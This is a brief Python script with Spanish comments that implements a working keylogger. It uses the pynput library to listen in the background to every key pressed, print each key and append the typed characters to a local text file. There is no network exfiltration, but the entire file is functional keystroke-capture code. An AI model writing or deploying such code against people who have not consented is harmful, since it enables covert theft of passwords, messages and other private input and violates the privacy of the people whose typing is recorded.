```python
from pynput import keyboard

def keyPressed(key):
    """
    Esta función obtendra, imprimira y agregara al archivo.txt toda la infromación que detecte que el usuario a tecleado 
    """
    print(str(key))
    with open("archivo.txt",'a') as logKey:
        # Aqui se manejan posibles errores al obtener datos, como algunas teclas no identificadas, etc.
        try: 
            char = key.char
            logKey.write(char)
        except:
            print("Error al obtener char")

# Aseguramos que el codigo esnte dentro del bloque, solo se ejecute si el script esta ejecutado directamente
if __name__ == "__main__":
    # Creamos a listener que monitoreara lo que tecleamos (keyboard)
    listener = keyboard.Listener(on_press=keyPressed)
    # Hilo separado, es decir que se ejecute en segundo plano
    listener.start()
    # Evitamos que el escrip termine despues de iniciar a listener
    input()
```
